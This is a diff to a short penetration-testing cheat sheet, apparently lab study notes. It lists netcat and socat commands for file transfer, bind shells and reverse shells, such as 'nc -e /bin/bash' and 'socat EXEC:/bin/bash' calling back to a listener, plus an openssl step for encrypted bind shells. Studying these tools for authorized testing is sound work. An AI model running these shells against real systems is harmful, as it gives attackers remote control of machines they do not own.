@@ -1,27 +1,48 @@
 # netcat
 #### file transfer
-target machine:
+target machine
 `nc -nlvp 9001 > incoming.exe`
-local machine:
+local machine
 `nc -nv IP.ADDR 9001 < EXAMPLE.exe`
 (note: no output, must guess when upload complete)
 
 #### bind shell
-target:
+target
 `nc -lnvp 9001 -e cmd.exe`
-local:
+local
 `nc -nv IP.ADDR 9001`
 
 #### reverse shell
-target:
+target
 `nc -nv IP.ADDR 9001 -e /bin/bash`
-local:
+local
 `nc -lnvp 9001`
 
 # socat
-connect
-`socat - TX`
+#### connecting
+`socat - TCP4:10.11.0.22:110`
 
+#### listener
+host
+`sudo socat TCP4-LISTEN:443 STDOUT`
+local
+`socat - TCP4:10.11.0.22:443`
+
+#### file transfer
+host
+`sudo socat TCP4-LISTEN:443,fork file:EXAMPLE.txt`
+local
+`socat TCP4:10.11.0.4:443 file:EXAMPLE_NAME.txt,create`
+
+#### reverse shell
+local
+`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
+target
+`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
+
+#### encrypted bind shells
+create self-signed certificate
+`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
 # windows
 ## one-liners
 #### dir and file
